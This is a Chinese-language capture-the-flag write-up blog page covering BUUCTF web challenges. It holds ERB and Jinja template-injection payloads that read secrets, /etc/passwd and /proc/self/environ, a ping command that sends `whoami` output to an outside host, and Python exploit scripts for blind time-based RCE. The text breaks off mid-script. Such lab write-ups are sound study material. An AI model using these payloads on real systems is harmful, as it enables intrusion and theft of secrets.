<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="buuctf-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/04/02/buuctf-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="buuctf-wp">
<meta property="og:url" content="https://glotozz.github.io/2020/04/02/buuctf-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/x5fnyOB8th2zvGi.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/Nf2RE6vGXelOUyA.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/E6F5vVGyoQDYdhR.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/pAu7fLaKm2NWDUv.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/J7xpo3XFNqKUuyS.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/biJyXEVDNrBLmFG.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/LmSRu4fcEXvW8ZD.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/hup76Ka8nRSfB9s.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/szHGSQAyn7weLER.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/nagAFWdTQuUmC8r.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/gkPVxbNFGzUsZrp.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/jcWJePmDI9pvlao.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/kl1h3jV7JUvC2QB.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/tRY2sKNo3wZTAB7.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/uetERnA3HwIkv7T.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/QBl23jJvPtY9SH5.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/Lkvxw82gRsbtjI9.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/j3Y9eLMKrFBz1xR.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/2yeaTlbnqZX9YtI.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/Uy4fq5dSeT2Cm7N.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/bzp87eIoHsZuU1E.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/7qoXwpbVFjdy1s2.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/zyFIR9MhWPwr5qY.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/zoy7JCHTqPnrWg1.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/qHtMWR6p8jnOe1S.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/gJmFAZUqT57wBSM.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/evKJYj1qb5kD2iW.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/sLuInU1eB7EyhDv.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/hAkqpG5VBIcO2jQ.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/LSC4AfQJTwXE1Mp.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/NMqoJHZwPCL3p2d.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/FSIxTCYn2RjfApE.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/3JpKbVZC2Uku1xo.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/fMKQO3j4luSp5bN.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/iF2SasLu4cPtzU3.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/n6xOef7up9vEGcV.png">
<meta property="og:image" content="https://i.loli.net/2020/04/11/J1s9AvfiX4Q2mrh.png">
<meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
<meta property="article:modified_time" content="2020-04-11T15:06:05.262Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> buuctf-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          buuctf-wp
        
      </h1>

      <time class="post-time">
          Apr 02 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#sctf2019flag-shop">[SCTF2019]Flag Shop</a></li>
<li><a href="#ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</a></li>
<li><a href="#rctf2019calcalcalc">[RCTF2019]calcalcalc</a></li>
<li><a href="#wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</a></li>
<li><a href="#wustctf2020easyweb">[WUSTCTF2020]easyweb</a></li>
<li><a href="#zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</a></li>
<li><a href="#zer0pts2020musicblog">[Zer0pts2020]musicblog</a></li>
<li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
<li><a href="#zer0pts2020urlapp">[Zer0pts2020]urlapp</a></li>
<li><a href="#zer0pts2020notepad">[Zer0pts2020]notepad</a></li>
<li><a href="#d3ctf-2019easyweb">[D3CTF 2019]EasyWeb</a></li>
<li><a href="#d3ctf-2019ezupload">[D3CTF 2019]EzUpload</a></li>
<li><a href="#d3ctf-2019showhub">[D3CTF 2019]Showhub</a></li>
<li><a href="#lfi2019">LFI2019</a></li>
<li><a href="#suctf-2018annonymous">[SUCTF 2018]annonymous</a></li>
<li><a href="#suctf-2018getshell">[SUCTF 2018]GetShell</a></li>
<li><a href="#suctf-2018multisql">[SUCTF 2018]MultiSQL</a></li>
<li><a href="#suctf-2018homework">[SUCTF 2018]Homework</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>玩狼人杀输一把刷3道buu哈哈</p>
<hr>
<p>#############04/02</p>
<h4><span id="sctf2019flag-shop">[SCTF2019]Flag Shop</span></h4><p><code>/filebak</code>得到源码</p>
<p>jwt身份验证，</p>
<p>先爆破一下密钥试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJiNjI2YjUyZi05OWYxLTQ1M2YtYjBhYy1iYzg3MTA3NjgwYzIiLCJqa2wiOjIwfQ.oKTH78tthnezEs9RXq5MQPiUIhiLrnUVtONe2yalk_I</span><br></pre></td></tr></table></figure>

<p>果然不行，</p>
<p><img src="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png" alt="Snipaste_2020-04-02_23-37-05.png"></p>
<p>根据源码需要用足够的jkl才能购买flag</p>
<p>这里的考点是erb模版注入读取secret</p>
<p>但是限制了用户输入为7位，但是模版渲染需要<code>&lt;%==&gt;</code>标志，也就是利用两个字符模版注入</p>
<p><img src="https://i.loli.net/2020/04/03/x5fnyOB8th2zvGi.png" alt="Snipaste_2020-04-02_23-50-12.png"></p>
<p><strong>方法一key爆破</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#96;   匹配文本之前的文本</span><br><span class="line">$&#39;   匹配文本之后的文本</span><br></pre></td></tr></table></figure>

<p>利用预定义字符<code>$</code>绕过第一个if判断并读取secret</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<p>再将jkl伪造成<code>1e27</code>，修改cookie购买flag，返回的jwt解码中存入了flag</p>
<p><strong>方法二HTTP参数传递类型差异攻击</strong></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/6686" target="_blank" rel="noopener">https://xz.aliyun.com/t/6686</a> </p>
</blockquote>
<p>举个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &quot;qwertyu&quot;</span><br><span class="line">$b &#x3D; Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]</span><br><span class="line">puts &quot;$a: #&#123;$a[0,3]&#125;&quot;</span><br><span class="line">puts &quot;$b: #&#123;$b[0,3]&#125;&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;result</span><br><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/03/Nf2RE6vGXelOUyA.png" alt="Snipaste_2020-04-03_00-16-00.png"></p>
<p>如果是命令执行没有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>



<h4><span id="ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</span></h4><p>提示secret，访问<code>/secret</code></p>
<p>提示传参secret，传参<code>?secret=aaaaa</code>，大于四位时报错</p>
<p>查看源码</p>
<p><img src="https://i.loli.net/2020/04/03/E6F5vVGyoQDYdhR.png" alt="Snipaste_2020-04-02_21-44-01.png"></p>
<p>明显的ssti，并且这里使用了自定义的RC4加密，具体需要查看<code>rc4_Modified.py</code>文件，这里用<code>%ff</code>可以触发报错</p>
<p><img src="https://i.loli.net/2020/04/03/pAu7fLaKm2NWDUv.png" alt="Snipaste_2020-04-02_22-02-00.png"></p>
<p>搜索一下找到了类似的源码</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage" target="_blank" rel="noopener">https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage</a> </p>
</blockquote>
<p>那么构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, public_key=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> public_key:</span><br><span class="line">            public_key = <span class="string">'none_public_key'</span></span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.index_i = <span class="number">0</span></span><br><span class="line">        self.index_j = <span class="number">0</span></span><br><span class="line">        self._init_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        初始化 置换盒</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        key_length = len(self.public_key)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            index = ord(self.public_key[(i % key_length)])</span><br><span class="line">            j = (j + self.Box[i] + index) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_crypt</span><span class="params">(self, string)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        加密/解密</span></span><br><span class="line"><span class="string">        string : 待加/解密的字符串</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">            self.index_i = (self.index_i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            self.index_j = (self.index_j + self.Box[self.index_i]) % <span class="number">256</span></span><br><span class="line">            self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j], self.Box[self.index_i]</span><br><span class="line">            r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">            R = self.Box[r]  <span class="comment"># 生成伪随机数</span></span><br><span class="line">            out.append(chr(ord(s) ^ R))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">payload = <span class="string">"&#123;&#123; config &#125;&#125;"</span></span><br><span class="line">payload = <span class="string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;"</span></span><br><span class="line">print(urllib.parse.quote(a.do_crypt(payload)))</span><br></pre></td></tr></table></figure>

<p> RC4，加密和解密是一样的再加密一次就等于解密 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%19V%A5%09%0Dgl%DD%C5%0E</span><br></pre></td></tr></table></figure>

<p>发现不行， 提示<code>ValueError: chr() arg not in range(256)</code></p>
<p>和一些其他脚本对比分析，初始化置换盒中的代码有点问题</p>
<p><code>self.Box = range(256)</code>应该转化为<code>self.Box = [i for i in range(256)]</code></p>
<p>并且需要使用python3的url编码。</p>
<p>命令执行但是无回显，这里为了方便就简单读取<code>/flag.txt</code></p>
<h4><span id="rctf2019calcalcalc">[RCTF2019]calcalcalc</span></h4><p>使用了拟态的构想，就是将用户输入的参数分别进入三种后端（php,python,nodejs），如果返回值不同则认定无效。</p>
<p>给了三种语言的源码</p>
<p><code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exec'</span> <span class="keyword">in</span> dir(__builtins__):</span><br><span class="line">        <span class="keyword">del</span> __builtins__.<span class="keyword">exec</span></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">        <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">"0.0.0.0"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure>

<p><code>index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> Module = <span class="built_in">require</span>(<span class="string">'module'</span>)</span><br><span class="line">    <span class="keyword">const</span> _require = Module.prototype.require</span><br><span class="line">    Module.prototype.require = <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ([<span class="string">'os'</span>, <span class="string">'child_process'</span>, <span class="string">'vm'</span>, <span class="string">'cluster'</span>].includes(arg)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> _require.call(_require, arg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">  </span><br><span class="line">  process.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> ret = <span class="built_in">eval</span>(msg)</span><br><span class="line">    process.send(ret)</span><br><span class="line">    process.exit(<span class="number">0</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<p>都过滤了各自的一些危险库，其中php设置了<code>disable_function</code></p>
<p>三种服务都在内网中，因此无法外带，可以考虑基于时间延时的RCE，参考<a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">Time_Based_RCE</a></p>
<p>原理类似sql盲注，因为前端会等待后端全部响应完成才继续执行网页</p>
<p><strong>python</strong></p>
<p>可以调用<code>time.sleep(5)</code>产生延时或者<code>set(1 for i in range(10000000))</code></p>
<p>其中第二种的延时较小，数值过大会内存错误</p>
<p>要在三种语言中既能造成延时又不crash，很难找到一个通用的表达式，思路可以找找注释符。</p>
<p><code>//</code>在php和nodejs中表示注释，在python中表示整数除法</p>
<p>大致思路如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x2F;&#x2F;1 and not (ord(open(&#39;&#x2F;flag&#39;).read()[0])&#x3D;&#x3D;1) and __import__(&#39;time&#39;).sleep(5)</span><br></pre></td></tr></table></figure>

<p>再看看前端的限制</p>
<p><img src="https://i.loli.net/2020/04/03/J7xpo3XFNqKUuyS.png" alt="Snipaste_2020-04-03_09-55-17.png"></p>
<p>可以通过json传一个<code>isVip</code>为true绕过，而正则可以通过<code>chr()</code>+拼接字符串的方式绕过</p>
<p>然而并没有延时明显延时</p>
<p><img src="https://i.loli.net/2020/04/03/biJyXEVDNrBLmFG.png" alt="Snipaste_2020-04-03_10-21-21.png"></p>
<p>再分析CTFTime上给的<a href="https://ctftime.org/writeup/15439" target="_blank" rel="noopener">脚本</a>，另一种思路：使用<code>eval()</code>来达到通用的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(__import__(&#39;time&#39;).sleep(5) if ord(open(&#39;&#x2F;flag&#39;).read()[3])&gt;&#x3D;64 else 1)</span><br></pre></td></tr></table></figure>

<p>测试成功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://39b0719c-b348-4b9c-af1f-8f62ab554bf7.node3.buuoj.cn/calculate'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    print(<span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(bool_expr)</span>:</span></span><br><span class="line">    payload = <span class="string">"__import__('time').sleep(5) if %s else 1"</span> % bool_expr</span><br><span class="line">    t = time()</span><br><span class="line">    r = requests.post(url, json=&#123;<span class="string">'isVip'</span>: <span class="literal">True</span>, <span class="string">'expression'</span>: encode(payload)&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    delta = time() - t</span><br><span class="line">    print(payload, delta)</span><br><span class="line">    <span class="keyword">return</span> delta &gt; <span 